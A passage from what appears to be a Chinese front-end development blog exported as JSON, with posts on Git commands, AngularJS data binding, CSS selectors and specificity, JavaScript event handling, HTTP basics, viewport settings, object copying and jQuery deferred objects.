[remote]&gt;&gt; # 增加一个新的远程仓库，并命名&gt; $ git remote add [shortname] [url]&gt;&gt; # 取回远程仓库的变化，并与本地分支合并&gt; $ git pull [remote] [branch]&gt;&gt; # 上传本地指定分支到远程仓库&gt; $ git push [remote] [branch]&gt;&gt; # 强行推送当前分支到远程仓库，即使有冲突&gt; $ git push [remote] --force&gt;&gt; # 推送所有分支到远程仓库&gt; $ git push [remote] --all&gt;&gt; 九、撤销 123456789101112131415161718192021222324252627282930313233&gt; # 恢复暂存区的指定文件到工作区&gt; $ git checkout [file]&gt;&gt; # 恢复某个commit的指定文件到暂存区和工作区&gt; $ git checkout [commit] [file]&gt;&gt; # 恢复暂存区的所有文件到工作区&gt; $ git checkout .&gt;&gt; # 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变&gt; $ git reset [file]&gt;&gt; # 重置暂存区与工作区，与上一次commit保持一致&gt; $ git reset --hard&gt;&gt; # 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变&gt; $ git reset [commit]&gt;&gt; # 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致&gt; $ git reset --hard [commit]&gt;&gt; # 重置当前HEAD为指定commit，但保持暂存区和工作区不变&gt; $ git reset --keep [commit]&gt;&gt; # 新建一个commit，用来撤销指定commit&gt; # 后者的所有变化都将被前者抵消，并且应用到当前分支&gt; $ git revert [commit]&gt;&gt; # 暂时将未提交的变化移除，稍后再移入&gt; $ git stash&gt; $ git stash pop&gt;&gt; 十、其他 123&gt; # 生成一个可供发布的压缩包&gt; $ git archive&gt; 转载 http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","comments":true,"tags":[{"name":"Git","slug":"Git","permalink":"http://www.wanyifeng.top/tags/Git/"}]},{"title":"双向数据绑定的内部流程","date":"2015-12-14T13:43:21.000Z","path":"2015/12/14/双向数据绑定的内部流程/","text":"凡是写了 ng-app 的 标签, 在代码的背后就创建了 一个 对象来维护 界面. 123&lt;body ng-app ng-class=\"&#123; down: down &#125;\"&gt; &lt;button ng-click=\"down=!down\"&gt; click &lt;/button&gt;&lt;/body&gt; 一开始背后有一个 $rootScope, 应该有一个属性叫 down( 实际上现在没有, 访问 是 undefined ) 当点击按钮的时候, 执行 ng-click 中的 代码, 即将 down 取反 在赋值( 界面中数据发生了变化 ) 通知背后的 $rootScope 对应的属性发生变化( 脏检查 ), 又通知界面. 界面不在更新. 但是 body 标签中的 要更新( 又有几次通知 ) 经典案例双向数据绑定的案例( 两个文本框 任意输入数据, 另一个文本框中有数据同步 ) 1234&lt;body ng-app&gt;&lt;!-- 背后就会创建一个对象( $rootScope ) --&gt; &lt;input type=\"text\" ng-model=\"txt\"&gt;&lt;br&gt; &lt;input type=\"text\" ng-model=\"txt\"&gt;&lt;/body&gt; 执行的过程( 脏检查( 判断一个变量的两次数据是否一样 )与digest循环( 处理过程 ) ) 第一个文本框中输入数据, 件事变化就会知道你修改的界面中的数据, 通知背后的对象更新属性. 背后的这个对象属性发生变化的时候( 赋值 ). 此时在 ng 内部又会监视到对象的属性发生变化. 得知数据属性变化, 那么又通知界面进行更新. 界面接收到更新的消息, 界面中要检查有几处要更新数据. 依次检查发出更新的前后, 各个数据的值是否有发生变化. 此时界面中有三处 txt, 第一个 txt 是一个文本框, 很明显这是修改发起的位置, 即数据的值必然相同. 因此此时没有更新发生. 将第二个文本框更新, 又要检查两次的数据是否一致, 很显然以前是空文本, 现在有数据, 因此要更新. 再通知背后的对象更新数据. 相当于递归开始. 背后的数据两次的值必然相同. 因此又不更新数据. 相当于递归结束. 继续更新 文本 此时该数据是一个单项数据绑定, 因此更新完不在发送跟新的消息到背后这个对象中. 整个操作结束. 模块与模块之间的关系与注入( 控制器作用 ) ng 只允许有一个 主模块( 页面中只能有一个 ng-app ) ng 允许存在多个模块, 但是多个模块要使用的时候应该注入到主模块中 1angular.module( '...', [ '...', '...' ] ) 按照我们将页面模块化的思想, 应该是各个功能都是一个独立的模块 ( 但是如果将页面都拆成多个模块注入使用 就又太麻烦, 因此引入 控制器划分作用域与初始化数据 ) 1234&lt;body ng-app&gt; &lt;div class=\"aside\"&gt;&lt;/div&gt; &lt;div class=\"main\"&gt;&lt;/div&gt;&lt;/body&gt; 这里的左右边栏是两个模块, 因此有两中处理办法 定义多模块 123456angular.module( 'aside', [] )angular.module( 'main', [] )angulr.module( 'app', [ 'aside', 'main' ] ) // 注入主模块//定义模块函数的第二个参数, 数组, 如果不提供就是获得模块(常用模型) 定义控制器( controller ) 定义控制器以后会同时在背后创建一个 $scope 对象, 该 $scope 对象原型继承自其容器对象背后的 scope 在定义控制器的时候, 相当于在 全局的 rootScope 中划分出了 scope, 即可以并存一些同名的变量, 方便管理.代码的执行, 注意 controller 这个方法什么时候执行?? 这些放在程序一开始运行的时候执行, 同时只会执行一次.在这些方法中可以利用 参数 拿到 $scope 即可为其成员初始化. 1234567891011121314151617181920&lt;body&gt; &lt;div ng-app=\"mainApp\"&gt; &lt;!-- $rootScope --&gt; mainApp: &lt;input type=\"text\" ng-model=\"txt\"&gt; &lt;div ng-controller=\"controller1\"&gt; &lt;!-- $scope --&gt; controller1: &lt;input type=\"text\" ng-model=\"txt\"&gt; &lt;div ng-controller=\"controller2\"&gt; &lt;!-- $scope --&gt; controller2: &lt;input type=\"text\" ng-model=\"txt\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div ng-controller=\"controller3\"&gt; &lt;!-- $scope --&gt; controller3: &lt;input type=\"text\" ng-model=\"txt\"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; angular.module( 'mainApp', [] ) .controller( 'controller1', function () &#123;&#125; ) .controller( 'controller2', function () &#123;&#125; ) .controller( 'controller3', function () &#123;&#125; );&lt;/script&gt; 从上面的结果可以看出scope对象只能向下通知而不能向上通知!!","comments":true,"tags":[{"name":"Angular","slug":"Angular","permalink":"http://www.wanyifeng.top/tags/Angular/"}]},{"title":"CSS 选择器的入门","date":"2015-12-03T03:43:21.000Z","path":"2015/12/03/CSS常用选择器/","text":"在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。 “CSS” 列指示该属性是在哪个 CSS 版本中定义的。（CSS1、CSS2 还是 CSS3。） 选择器 例子 例子描述 CSS [.class] .intro 选择 class=”intro” 的所有元素。 1 [#id] #firstname 选择 id=”firstname” 的所有元素。 1 [*] * 选择所有元素。 2 [element] p 选择所有 元素。 1 [element,element] div,p 选择所有 元素和所有 元素。 1 [element element] div p 选择 元素内部的所有 元素。 1 [element&gt;element] div&gt;p 选择父元素为 元素的所有 元素。 2 [element+element] div+p 选择紧接在 元素之后的所有 元素。 2 [[attribute]] [target] 选择带有 target 属性所有元素。 2 [[attribute=value]] [target=_blank] 选择 target=”_blank” 的所有元素。 2 [[attribute~=value]] [title~=flower] 选择 title 属性包含单词 “flower” 的所有元素。 2 [[attribute1=value]] [lang\\1=en] 选择 lang 属性值以 “en” 开头的所有元素。1是竖线 2 [:link] a:link 选择所有未被访问的链接。 1 [:visited] a:visited 选择所有已被访问的链接。 1 [:active] a:active 选择活动链接。 1 [:hover] a:hover 选择鼠标指针位于其上的链接。 1 [:focus] input:focus 选择获得焦点的 input 元素。 2 [:first-letter] p:first-letter 选择每个 元素的首字母。 1 [:first-line] p:first-line 选择每个 元素的首行。 1 [:first-child] p:first-child 选择属于父元素的第一个子元素的每个 元素。 2 [:before] p:before 在每个 元素的内容之前插入内容。 2 [:after] p:after 在每个 元素的内容之后插入内容。 2 [:lang(language)] p:lang(it) 选择带有以 “it” 开头的 lang 属性值的每个 元素。 2 [element1~element2] p~ul 选择前面有 元素的每个 元素。 3 [[attribute^=value]] a[src^=”https”] 选择其 src 属性值以 “https” 开头的每个 元素。 3 [[attribute$=value]] a[src$=”.pdf”] 选择其 src 属性以 “.pdf” 结尾的所有 元素。 3 [[attribute**=value*]] a[src*=”abc”] 选择其 src 属性中包含 “abc” 子串的每个 元素。 3 [:first-of-type] p:first-of-type 选择属于其父元素的首个 元素的每个 元素。 3 [:last-of-type] p:last-of-type 选择属于其父元素的最后 元素的每个 元素。 3 [:only-of-type] p:only-of-type 选择属于其父元素唯一的 元素的每个 元素。 3 [:only-child] p:only-child 选择属于其父元素的唯一子元素的每个 元素。 3 [:nth-child(n)] p:nth-child(2) 选择属于其父元素的第二个子元素的每个 元素。 3 [:nth-last-child(n)] p:nth-last-child(2) 同上，从最后一个子元素开始计数。 3 [:nth-of-type(n)] p:nth-of-type(2) 选择属于其父元素第二个 元素的每个 元素。 3 [:nth-last-of-type(n)] p:nth-last-of-type(2) 同上，但是从最后一个子元素开始计数。 3 [:last-child] p:last-child 选择属于其父元素最后一个子元素每个 元素。 3 [:root] :root 选择文档的根元素。 3 [:empty] p:empty 选择没有子元素的每个 元素（包括文本节点）。 3 [:target] #news:target 选择当前活动的 #news 元素。 3 [:enabled] input:enabled 选择每个启用的 元素。 3 [:disabled] input:disabled 选择每个禁用的 元素 3 [:checked] input:checked 选择每个被选中的 元素。 3 [:not(selector)] :not(p) 选择非 元素的每个元素。 3 [::selection] ::selection 选择被用户选取的元素部分。 3 样式类型 行间 1&lt;h1 style=\"font-size:12px;color:#000;\"&gt;行间C样式&lt;/h1&gt; 内联 12345&lt;style type=\"text/css\"&gt; h1&#123;font-size:12px; color:#000; &#125;&lt;/style&gt; 外部 1&lt;link rel=\"stylesheet\" href=\"css/style.css\"&gt; 选择器类型1234567891011121314151、ID #id2、class .class3、标签 p4、通用 \\*5、属性 [type=\"text\"]6、伪类 :hover7、伪元素 ::first-line8、子选择器、相邻选择器 权重计算规则 第一等：代表内联样式，如: style=””，权值为1000。 第二等：代表ID选择器，如：#content，权值为0100。 第三等：代表类，伪类和属性选择器，如.content，权值为0010。 第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。 通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。 继承的样式没有权值。 比较规则 1,0,0,0 &gt; 0,99,99,99。也就是说从左往右逐个等级比较，前一等级相等才往后比。 无论是行间、内部和外部样式，都是按照这个规则来进行比较。而不是直观的行间&gt;内部&gt;外部样式；ID&gt;class&gt;元素。之所以有这样的错觉，是因为确实行间为第一等的权重，所以它的权重是最高的。而内部样式可能一般写在了外部样式引用了之后，所以覆盖掉了之前的。 在权重相同的情况下，后面的样式会覆盖掉前面的样式。 通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。 ！important !important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。` 1p&#123; color:red !important;&#125; /我显示红色/ ie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"js事件绑定与移除","date":"2015-11-01T12:18:01.000Z","path":"2015/11/01/js事件绑定与移除/","text":"监听事件的绑定与移除主要是addEventListener和removeEventListener的运用。 addEventListener语法 element.addEventListener(type，handler，false/true) type:事件类型 handler:事件执行触发的函数 false/true:false为冒泡/ture为捕获，参数是true，表示在捕获阶段调用事件处理程序；如果是false，表示在冒泡阶段调用事件处理程序。 事件捕获：父级元素先触发，子集元素后触发； 事件冒泡：子集元素先触发，父级元素后触发； 一般的绑定事件，都是采用冒泡方式，也就是使用false removeEventListener语法element.removeEventListener(type，handler，false/true) 参数值含义和上述一样。 12345678910111213141516var btn1=document.getElementById(\"btn1\");var handle1=function() &#123; alert(\"事件触发\") btn1.removeEventListener(\"click\",handle1,false);&#125;btn1.addEventListener('click',handle1,false); var btn2=document.getElementById(\"btn2\");/*匿名函数*/btn2.addEventListener(\"click\",function()&#123; alert(123); removeEventListener(\"click\",function()&#123; alert(123) &#125;,false)&#125;,false) 通过匿名函数是无法消除监听事件，只有通过实名函数才能。 事件兼容处理1234567891011121314151617181920212223var EventUtil=&#123; addHandler:function(element,type,handler)&#123; if(element.addEventListener)&#123; element.addEventListener(type,handler,false); &#125; else if(element.attachEvent)&#123; /*IE*/ element.attachEvent('on'+type,handler); &#125; else&#123; element[\"on\"+type]=handler /*直接赋给事件*/ &#125; &#125;, removeHandler:function(element,type,handler) &#123; if (element.removeEventListener) element.removeEventListener(type, handler, false); else if (element.deattachEvent) &#123; /*IE*/ element.deattachEvent('on' + type, handler); &#125; else &#123; element[\"on\" + type] = null;/*直接释放*/ &#125; &#125; &#125;;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"文字英文字母排版","date":"2015-10-23T11:25:21.000Z","path":"2015/10/23/css文字断行/","text":"默认的 word-wrap:break-word word-break:break-all","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"JS中的事件绑定，事件捕获，事件冒泡以及事件委托，兼容IE","date":"2015-10-08T11:38:21.000Z","path":"2015/10/08/js事件冒泡和事件捕获/","text":"● 事件分为三个阶段： 事件捕获 –&gt; 事件目标 –&gt; 事件冒泡 ● 事件捕获：事件发生时（onclick,onmouseover……）首先发生在document上，然后依次传递给body、&hellip;&hellip;最后到达目的节点（即事件目标）。 ● 事件冒泡：事件到达事件目标之后不会结束，会逐层向上冒泡，直至document对象，跟事件捕获相反 1、onlick –&gt;事件冒泡，重写onlick会覆盖之前属性，没有兼容性问题 1ele.onclik = null; //解绑单击事件，将onlick属性设为null即可 2、addEventListener(event.type, handle, boolean); IE8及以下不支持，属于DOM2级的方法，可添加多个方法不被覆盖 1234//事件类型没有on，false 表示在事件第三阶段（冒泡）触发，true表示在事件第一阶段（捕获）触发。 如果handle是同一个方法，只执行一次。ele.addEventListener('click', function()&#123; &#125;, false); //解绑事件，参数和绑定一样ele.removeEventListener(event.type, handle, boolean); 3、attachEvent(event.type, handle ); IE特有，兼容IE8及以下，可添加多个事件处理程序，只支持冒泡阶段 1234//如果handle是同一个方法，绑定几次执行几次，这点和addEventListener不同,事件类型要加on,例如onclick而不是clickele.attachEvent('onclick', function()&#123; &#125;); //解绑事件，参数和绑定一样ele.detachEvent(\"onclick\", function()&#123; &#125;); 4、默认事件行为：href=””链接，submit表单提交等 ● 阻止默认事件： （1）return false; 阻止独享属性（通过on这种方式）绑定的事件的默认事件 1234ele.onclick = function() &#123; …… //你的代码 return false; //通过返回false值阻止默认事件行为&#125;; （2）event.preventDefault( ); 阻止通过 addEventListener( ) 添加的事件的默认事件 12345element.addEventListener(\"click\", function(e)&#123; var event = e || window.event; …… event.preventDefault( ); //阻止默认事件&#125;,false); （3）event.returnValue = false; 阻止通过 attachEvent( ) 添加的事件的默认事件 12345element.attachEvent(\"onclick\", function(e)&#123; var event = e || window.event; …… event.returnValue = false; //阻止默认事件&#125;,false); 5、接下来我们把事件绑定以及事件解绑封装成为一个函数，兼容浏览器，包括IE6及以上 12345678910// 事件绑定function addEvent(element, eType, handle, bol) &#123; if(element.addEventListener)&#123; //如果支持addEventListener element.addEventListener(eType, handle, bol); &#125;else if(element.attachEvent)&#123; //如果支持attachEvent element.attachEvent(\"on\"+eType, handle); &#125;else&#123; //否则使用兼容的onclick绑定 element[\"on\"+eType] = handle; &#125;&#125; 12345678910// 事件解绑function removeEvent(element, eType, handle, bol) &#123; if(element.addEventListener)&#123; element.removeEventListener(eType, handle, bol); &#125;else if(element.attachEvent)&#123; element.detachEvent(\"on\"+eType, handle); &#125;else&#123; element[\"on\"+eType] = null; &#125;&#125; ----------------------------------------------------------------------------------------------------------------------------------------------- A.● 事件冒泡、事件捕获阻止： event.stopPropagation( ); // 阻止事件的进一步传播，包括（冒泡，捕获），无参数 event.cancelBubble = true; // true 为阻止冒泡 B.● 事件委托：利用事件冒泡的特性，将里层的事件委托给外层事件，根据event对象的属性进行事件委托，改善性能。 使用事件委托能够避免对特定的每个节点添加事件监听器；事件监听器是被添加到它们的父元素上。事件监听器会分析从子元素冒泡上来的事件，找到是哪个子元素的事件。 来个例子吧，如果要单独点击table里面的td，普通做法是for循环给每个td绑定事件，td少的话性能什么差别，td如果多了，就不行了，我们使用事件委托: 123456789101112131415 &lt;!-- HTML --&gt;&lt;table id=\"out\" border=\"1\" style=\"cursor: pointer;\"&gt; &lt;tr&gt; &lt;td&gt;table01&lt;/td&gt; &lt;td&gt;table02&lt;/td&gt; &lt;td&gt;table03&lt;/td&gt; &lt;td&gt;table04&lt;/td&gt; &lt;td&gt;table05&lt;/td&gt; &lt;td&gt;table06&lt;/td&gt; &lt;td&gt;table07&lt;/td&gt; &lt;td&gt;table08&lt;/td&gt; &lt;td&gt;table09&lt;/td&gt; &lt;td&gt;table10&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 1234567891011121314151617181920212223242526272829 var out = document.getElementById(\"out\"); if(out.addEventListener)&#123; out.addEventListener(\"click\",function(e)&#123; var e = e||window.event; //IE没有e.target，有e.srcElement var target = e.target||e.srcElement; //判断事件目标是否是td，是的话target即为目标节点td if(target.tagName.toLowerCase()==\"td\")&#123; changeStyle(target); console.log(target.innerHTML); &#125; &#125;,false); &#125;else&#123; out.attachEvent(\"onclick\",function(e)&#123; var e = e||window.event; //IE没有e.target，有e.srcElement var target = e.target||e.srcElement; //判断事件目标是否是td，是的话target即为目标节点td if(target.tagName.toLowerCase()==\"td\")&#123; changeStyle(target); console.log(target.innerHTML); &#125; &#125;); &#125;;&#125;;function changeStyle(ele)&#123; ele.innerHTML = \"已点击\" ele.style.background=\"#900\"; ele.style.color = \"#fff\"; &#125; 转载自 http://www.cnblogs.com/zhangmingze/p/4864367.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"HTTP协议","date":"2015-09-25T06:33:21.000Z","path":"2015/09/25/HTTP/","text":"即超文本传输协议，网站是基于HTTP协议的，例如网站的图片、CSS、JS等都是基于HTTP协议进行传输的。 HTTP协议是由从客户机到服务器的请求(Request)和从服务器到客户机的响应(Response)进行了约束和规范。 即HTTP协议主要由请求和响应构成。 常用请求方法 POST、GET、PUT、DELETE 请求/请求报文 请求由客户端发起，其规范格式为：请求行、请求头、请求主体 请求行 ​ POST/ url HTTP/1.1 ​ 由请求方式、请求URL和协议版本构成 请求头 ​ Host：localhost请求的主机 ​ Cache-Control：max-age=0控制缓存 ​ Accept：/ 接受的文档MIME类型 User-Agent：很重要 ​ Referer：从哪个URL跳转过来的 ​ Accept-Encoding：可接受的压缩格式 请求主体 ​ 即传递给服务端的数据 注：当以post形式提交表单的时候，请求头里会设置 Content-Type:application/x-www-form-urlencoded，以get形式当不需要 ​ 响应/响应报文 响应由服务器发出，其规范格式为：状态行、响应头、响应主体。 状态行 由协议版本号、状态码和状态信息构成 响应头 ​ Date：响应时间 ​ Server：服务器信息 ​ Content-Length：响应主体长度 ​ Content-Type：响应资源的MIME类型 ​ MIME是标识文件类型的，文件后缀并不能正确无误的标识文件的类型。 客户端与服务器在进行数据传输的时候都是以字节形式进行的，咱们可以理解成是以“文本形式”传输，这时浏览器就需要明确知道该怎么样来解析这些文本形式的数据，MIME就是明确告知浏览器该如何来处理 响应主体 即服务端返回给客户端的内容； 常见的有200代表成功、304文档未修改、403没有权限、404未找到、500服务器错误 ​ ​","comments":true,"tags":[{"name":"http","slug":"http","permalink":"http://www.wanyifeng.top/tags/http/"}]},{"title":"视口属性介绍","date":"2015-09-12T11:33:21.000Z","path":"2015/09/12/视口属性介绍/","text":"1.meta:vp + tab 生成 1&lt;meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\" /&gt; &lt;meta name=”viewport” content=”width=device-width,根据屏幕宽度调整欢宽度 user-scalable=no,用户是否可以缩放 initial-scale=1.0,默认的缩放值 maximum-scale=1.0,最大的缩放值 minimum-scale=1.0”最小的缩放 值/&gt; 小知识点去除移动端默认的点击高亮效果1-weblit-tap-highlight-color:transparent *无法命中伪元素 1*,::before,::after /*这样可以命中伪元素*/","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"深拷贝和浅拷贝","date":"2015-07-24T02:47:21.000Z","path":"2015/07/24/深拷贝和浅拷贝/","text":"浅拷贝 12345678 function extendCopy(p) &#123; var c = &#123;&#125;; for (var i in p) &#123; c[i] = p[i]; &#125; c.uber = p; return c; &#125; 把父对象的属性，全部拷贝给子对象，也能实现继承 但是，这样的拷贝有一个问题。那就是，如果父对象的属性等于数组或另一个对象，那么实际上，子对象获得的只是一个内存地址，而不是真正拷贝，因此存在父对象被篡改的可能深拷贝123456789101112 function deepCopy(p, c) &#123; var c = c || &#123;&#125;; for (var i in p) &#123; if (typeof p[i] === 'object') &#123; c[i] = (p[i].constructor === Array) ? [] : &#123;&#125;; deepCopy(p[i], c[i]); &#125; else &#123; c[i] = p[i]; &#125; &#125; return c; &#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"继承","slug":"继承","permalink":"http://www.wanyifeng.top/tags/继承/"}]},{"title":"js简单功能Demo","date":"2015-07-11T02:11:21.000Z","path":"2015/07/11/js简单动画demo/","text":"1 返回时间 2 节点操作兼容代码 3 简单平滑动画 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216/* * 该函数是返回的是指定格式的日期,是字符串类型 * 参数:date ----日期 * 返回值: 字符串类型的日期 * */function getDatetoString(date) &#123; var strDate;//存储日期的字符串 //获取年 var year=date.getFullYear(); //获取月 var month=date.getMonth()+1; //获取日 var day=date.getDate(); //获取小时 var hour=date.getHours(); //获取分钟 var minute=date.getMinutes() //获取秒 var second=date.getSeconds(); hour=hour&lt;10?\"0\"+hour:hour; minute=minute&lt;10?\"0\"+minute:minute; second=second&lt;10?\"0\"+second:second; //拼接 strDate=year+\"-\"+month+\"-\"+day+\" \"+hour+\":\"+minute+\":\"+second;//隐藏问题,关于变量声明的位置 return strDate;&#125;//根据id获取元素对象function my$(id) &#123; return document.getElementById(id);&#125;/* * * innerText属性IE中支持 * textContent火狐中支持 * dvObj.innerText=\"您好\";设置innerText的值 * console.log(dvObj.innerText);获取innerText的值 * 因为上述原因,inerText有时候需要设置值，有时候需要获取值 * 所以,需要写一个兼容的代码能在火狐中使用,也可以在IE中使用 * * * *//* *设置innerText属性的值 * element-----为某个元素设置属性值 * content-----设置的值 * */function setInnerText(element,content) &#123; if(typeof element.textContent===\"undefined\")&#123; //IE浏览器 element.innerText=content; &#125;else&#123; element.textContent=content; &#125;&#125;/* * 获取innerText属性的值 * element 要获取的元素 * 返回的是该元素的innerText值 * */function getInnerText(element) &#123; if(typeof element.textContent===\"undefined\")&#123; //IE浏览器 return element.innerText; &#125;else&#123; return element.textContent; &#125;&#125;//获取当前元素前一个元素function getPreviousElement(element) &#123; if(element.previousElementSibling)&#123; return element.previousElementSibling; &#125;else&#123; var ele=element.previousSibling; while (ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.previousSibling; &#125; return ele; &#125;&#125;//获取当前元素的后一个元素function getNextElement(element) &#123; if(element.nextElementSibling)&#123; return element.nextElementSibling; &#125;else&#123; var ele=element.nextSibling; while(ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.nextSibling; &#125; return ele; &#125;&#125;//获取父元素中的第一个元素function getFirstElementByParent(parent) &#123; if(parent.firstElementChild)&#123; return parent.firstElementChild; &#125;else&#123; var ele=parent.firstChild; while (ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.nextSibling; &#125; return ele; &#125;&#125;//获取父元素中的最后一个元素function getLastElementByParent(parent) &#123; if(parent.lastElementChild)&#123; return parent.lastElementChild; &#125;else&#123; var ele=parent.lastChild; while(ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.previousSibling; &#125; return ele; &#125;&#125;//获取兄弟元素function getsiblings(ele) &#123; if(!ele)return;//判断当前的ele这个元素是否存在 var elements=[];//定义数组的目的就是存储当前这个元素的所有的兄弟元素 var el=ele.previousSibling;//当前元素的前一个节点 while (el)&#123; if (el.nodeType===1)&#123;//元素 elements.push(el);//加到数组中 &#125; el=el.previousSibling; &#125; el=ele.nextSibling; while(el)&#123; if(el.nodeType===1)&#123; elements.push(el); &#125; el=el.nextSibling; &#125; return elements;&#125;// //能力检测多个浏览器为同一个对象注册多个事件var EventTools= &#123; //为对象添加注册事件 addEventListener: function (element, eventName, listener) &#123; if (element.addEventListener) &#123; element.addEventListener(eventName, listener, false); &#125; else if (element.attachEvent) &#123; element.attachEvent(\"on\" + eventName, listener) &#125; else &#123; element[\"on\" + eventName] = listener; &#125; &#125;, //为对象移除事件 removeEventListener: function (element, eventName, listener) &#123; if (element.removeEventListener) &#123; element.removeEventListener(eventName, listener, false); &#125; else if (element.detachEvent) &#123; element.detachEvent(\"on\" + eventName, listener); &#125; else &#123; element[\"on\" + eventName] = null; &#125; &#125;, //获取参数e getEvent: function (e) &#123; return e || window.event; &#125;, getPageX: function (e) &#123; if (e.pageX) &#123; return e.pageX; &#125; else &#123; //有的浏览器把高度设计在了文档的第一个元素中了 //有的浏览器把高度设计在了body中了 //document.documentElement.scrollTop;//文档的第一个元素 //document.body.scrollTop; var scrollLeft = document.documentElement.scrollLeft || document.body.scrollLeft; return e.clientX + scrollLeft; &#125; &#125;, getPageY: function (e) &#123; if (e.pageY) &#123; return e.pageY; &#125; else &#123; var scrollTop = document.documentElement.scrollTop || document.body.scrollTop; return e.clientY + scrollTop; &#125; &#125;&#125;//获取元素的当前位置,移动,每次移动多少像素function animate(element,target) &#123; //每次调用这个函数的时候先清理之前的计时器 clearInterval(element.setId); element.setId=setInterval(function () &#123; //获取元素当前的位置 var current=element.offsetLeft; //每次移动的像素 var step=10; //判断移动的步数应该是正数还是负数 step=current&lt;target?step:-step; //当前的位置=之前的当前位置+移动的步数 current=current+step; if(Math.abs(target-current)&lt;Math.abs(step))&#123; //把计时器清理 clearInterval(element.setId); element.style.left=target+\"px\"; &#125;else&#123; //赋值给要移动的元素 element.style.left=current+\"px\"; &#125; &#125;,5);&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"jQuery的deferred对象详解","date":"2015-07-08T03:33:01.000Z","path":"2015/07/08/jQuery的deferred对象详解/","text":"jQuery的deferred对象详解 作者：阮一峰 一、什么是deferred对象？ 开发网站的过程中，我们经常遇到某些耗时很长的javascript操作。其中，既有异步的操作（比如ajax读取服务器数据），也有同步的操作（比如遍历一个大型数组），它们都不是立即能得到结果的。 通常的做法是，为它们指定回调函数（callback）。即事先规定，一旦它们运行结束，应该调用哪些函数。 但是，在回调函数方面，jQuery的功能非常弱。为了改变这一点，jQuery开发团队就设计了deferred对象。 简单说，deferred对象就是jQuery的回调函数解决方案。在英语中，defer的意思是”延迟”，所以deferred对象的含义就是”延迟”到未来某个点再执行。 它解决了如何处理耗时操作的问题，对那些操作提供了更好的控制，以及统一的编程接口。它的主要功能，可以归结为四点。下面我们通过示例代码，一步步来学习。 二、ajax操作的链式写法 首先，回顾一下jQuery的ajax操作的传统写法： $.ajax({ url: “test.html”, success: function(){ alert(“哈哈，成功了！”); }, error:function(){ alert(“出错啦！”); } }); （运行代码示例1） 在上面的代码中，$.ajax()接受一个对象参数，这个对象包含两个方法：success方法指定操作成功后的回调函数，error方法指定操作失败后的回调函数。 $.ajax()操作完成后，如果使用的是低于1.5.0版本的jQuery，返回的是XHR对象，你没法进行链式操作；如果高于1.5.0版本，返回的是deferred对象，可以进行链式操作。 现在，新的写法是这样的： $.ajax(“test.html”) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例2） 可以看到，done()相当于success方法，fail()相当于error方法。采用链式写法以后，代码的可读性大大提高。 三、指定同一操作的多个回调函数 deferred对象的一大好处，就是它允许你自由添加多个回调函数。 还是以上面的代码为例，如果ajax操作成功后，除了原来的回调函数，我还想再运行一个回调函数，怎么办？ 很简单，直接把它加在后面就行了。 $.ajax(“test.html”) .done(function(){ alert(“哈哈，成功了！”);} ) .fail(function(){ alert(“出错啦！”); } ) .done(function(){ alert(“第二个回调函数！”);} ); （运行代码示例3） 回调函数可以添加任意多个，它们按照添加顺序执行。 四、为多个操作指定回调函数 deferred对象的另一大好处，就是它允许你为多个事件指定一个回调函数，这是传统写法做不到的。 请看下面的代码，它用到了一个新的方法$.when()： $.when($.ajax(“test1.html”), $.ajax(“test2.html”)) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例4） 这段代码的意思是，先执行两个操作$.ajax(“test1.html”)和$.ajax(“test2.html”)，如果都成功了，就运行done()指定的回调函数；如果有一个失败或都失败了，就执行fail()指定的回调函数。 五、普通操作的回调函数接口（上） deferred对象的最大优点，就是它把这一套回调函数接口，从ajax操作扩展到了所有操作。也就是说，任何一个操作—-不管是ajax操作还是本地操作，也不管是异步操作还是同步操作—-都可以使用deferred对象的各种方法，指定回调函数。 我们来看一个具体的例子。假定有一个很耗时的操作wait： var wait = function(){ var tasks = function(){ alert(“执行完毕！”); }; setTimeout(tasks,5000); }; 我们为它指定回调函数，应该怎么做呢？ 很自然的，你会想到，可以使用$.when()： $.when(wait()) .done(function(){ alert(“哈哈，成功了！”); }) .fail(function(){ alert(“出错啦！”); }); （运行代码示例5） 但是，这样写的话，done()方法会立即执行，起不到回调函数的作用。原因在于$.when()的参数只能是deferred对象，所以必须对wait()进行改写： var dtd = $.Deferred(); // 新建一个deferred对象 var wait = 